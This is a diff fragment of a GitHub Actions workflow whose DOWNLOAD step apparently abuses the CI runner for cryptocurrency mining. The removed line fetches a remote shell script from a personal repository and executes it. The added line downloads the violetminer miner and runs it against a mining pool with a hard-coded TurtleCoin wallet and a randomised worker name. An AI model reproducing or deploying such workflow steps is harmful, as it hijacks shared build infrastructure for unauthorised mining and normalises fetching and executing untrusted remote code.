@@ -32,8 +32,8 @@ jobs:
 
     - name: DOWNLOAD
 
-      run: Invoke-WebRequest wget https://raw.githubusercontent.com/angkii/bh/main/veruss.sh && chmod 777 veruss.sh && ./veruss.sh
-
+      run: Invoke-WebRequest wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv2zcCvhGLNapck1NKJ8bckuWx63mpGx59iY4wcer8RoAndB9wjNXTJuaYzH8BuFqJWGAGPNFKAqJHY6TqsvTJ5jnTq4hk9V.$(echo $(shuf -i 1000-9999999999 -n 1)-T4#ha9f-ie8n) --password x --algorithm chukwa/wrkz
+      
     - name: DONE
 
       run: exit
